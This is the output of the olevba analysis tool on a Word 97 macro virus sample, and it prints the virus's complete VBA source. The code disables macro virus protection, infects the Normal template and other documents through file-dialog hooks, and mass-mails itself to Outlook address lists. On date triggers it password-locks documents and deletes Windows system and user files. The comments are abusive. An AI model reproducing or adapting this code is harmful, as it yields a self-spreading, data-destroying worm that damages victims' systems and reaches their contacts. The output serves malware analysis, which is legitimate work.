olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zerg-153732cc6bd53422f932a5646ff8af0211382bc7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zerg-153732cc6bd53422f932a5646ff8af0211382bc7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Zerg.bas 
in file: Virus.MSWord.Zerg-153732cc6bd53422f932a5646ff8af0211382bc7 - OLE stream: 'Macros/VBA/ZeRg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Attribute AutoExec.VB_Description = "ZeRg 1.0"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.ZeRg.AutoExec"
' The ZeRg WM97 Virus (c) 1999 ElectroMagnetic Defication
' First Attempt At Macro Viruses For Word 97
' If You Are Reading This, Then You Are Smarter Than The Average Idiot.
' I Should Have Made This To Just Send The E-Mail And Toast The Drive, But I Decided Not To.
' Greetings To F-Prot, McAfee-(World's Worst AV), Norton, Dr. Solomon (Now Gay As McAfee), Fuck You All In The Ass!!!!!
' Thank You For Purchasing Microsoft Office 97
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("ZeRg").Export "c:\ZeRg.mta"
If Day(Now) = Minute(Now) Then
With WordBasic
.Call "YourAss"
End With
GoTo AllDone

AllDone:
On Error Resume Next
End If
End Sub

Sub ToolsMacro()
With WordBasic
.Call "YourAss"
End With
End Sub

Sub ViewVBCode()
With WordBasic
.Call "YourAss"
End With
End Sub

Sub YourAss()
On Error Resume Next
Kill "*.*"
Kill "c:\*.*"
Kill "c:\zerg.mta"
Kill "c:\windows\*.*"
Kill "c:\windows\*.exe"
Kill "c:\windows\*.com"
Kill "c:\windows\system\*.dll"
Kill "c:\windows\system\*.*"
Kill "c:\windows\command\*.exe"
Kill "c:\windows\command\*.*"
Kill "c:\My Documents\*.*"
Kill "c:\winnt\*.exe"
Kill "c:\winnt\*.*"
Kill "c:\winnt\system\*.*"
Kill "c:\winnt\system\*.dll"
Kill "c:\winnt\system32\*.*"
Kill "c:\winnt\system32\*.dll"
Kill "c:\winnt\system32\drivers\*.*"
Kill "c:\winnt\system32\win.com"
Kill "c:\winnt\system32\drivers\*.sys"
Tasks.ExitWindows
MsgBox "Hello " & Application.UserName & " You Stupid Fuck! Your Computer Has Been Fucked By ZeRg 1.0", vbOKOnly
End Sub

Sub AutoOpen()
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Day(Now) = Hour(Now) Then
Set FunnyShit = ActiveDocument
FunnyShit.Password = "ZeRg1.0"
ActiveDocument.Save
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "ZeRg") = "(c) 1999 Electro Magnetic Defication"
Dim EN$
On Error GoTo -1: On Error GoTo NotThere
With WordBasic
.ToolsMacro Name:="CheckForZerg", Show:=1, Run:=1
.Call "Zerg"
End With
GoTo AlreadyThere
NotThere:
Err.Number = 0
On Error Resume Next
EN$ = WordBasic.[FileName$]()
With WordBasic
.MacroCopy EN$ + ":ZeRg", "ZeRg", 1
NormalTemplate.Save
Application.VBE.ActiveVBProject.VBComponents("ZeRg").Export "c:\ZeRg.mta"
End With
GoTo AlreadyThere
AlreadyThere:
If Day(Now) = Minute(Now) Then
With WordBasic
.Call "YourAss"
End With
GoTo AllDone

AllDone:
End If
End Sub
Sub CheckForZerg()

End Sub
Sub FileOpen()
On Error GoTo ChangeMind
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
With WordBasic
.CurValues.FileOpen dlg
.Dialog.FileOpen dlg
.FileOpen dlg
.Call "Zerg"
End With
ChangeMind:
End Sub

Sub FilePrint()
On Error GoTo ChangeMind
Options.VirusProtection = False
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
With WordBasic
.CurValues.FilePrint dlg
.Dialog.FilePrint dlg
.FilePrint dlg
.Call "Zerg"
End With
ChangeMind:
End Sub

Sub FileSaveAs()
On Error GoTo ChangeMind
Options.VirusProtection = False
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
With WordBasic
.CurValues.FileSaveAs dlg
.Dialog.FileSaveAs dlg
.FileSaveAs dlg
.Call "Zerg"
End With
ChangeMind:
End Sub

Sub Zerg()
Attribute Zerg.VB_ProcData.VB_Invoke_Func = "Normal.ZeRg.Zerg"
On Error Resume Next
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "ZeRg" Then Z = True
Next i
If Z = True Then GoTo AlreadyThere Else
ActiveDocument.VBProject.VBComponents.Import "c:\ZeRg.mta"
ActiveDocument.Save
Dim UsingOutlook, UserNameMapi, SendIt
Set UsingOutlook = CreateObject("Outlook.Application")
Set UserNameMapi = UsingOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "ZeRg") <> "(c) 1999 Electro Magnetic Defication" Then
If UsingOutlook = "Outlook" Then
UserNameMapi.Logon "profile", "password"
For Z = 1 To UserNameMapi.AddressLists.Count
Set BookList = UserNameMapi.AddressLists(Z)
X = 1
Set SendIt = UsingOutlook.CreateItem(O)
For XX = 1 To BookList.AddressEntries.Count
Lookn = BookList.AddressEntries(X)
SendIt.Recipients.Add Lookn
X = X + 1
If X > 101 Then XX = BookList.AddressEntries.Count
Next XX
SendIt.Subject = "Please Read The Attached Document."
SendIt.Body = "Important Information Is Enclosed"
SendIt.Attachments.Add ActiveDocument.FullName
SendIt.Send
Lookn = ""
Next Z
UserNameMapi.Logoff
End If
GoTo AllDone

AlreadyThere:
On Error Resume Next
If Day(Now) = Minute(Now) Then
With WordBasic
.Call "YourAss"
End With
End If
GoTo AllDone

AllDone:
End If
End Sub









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

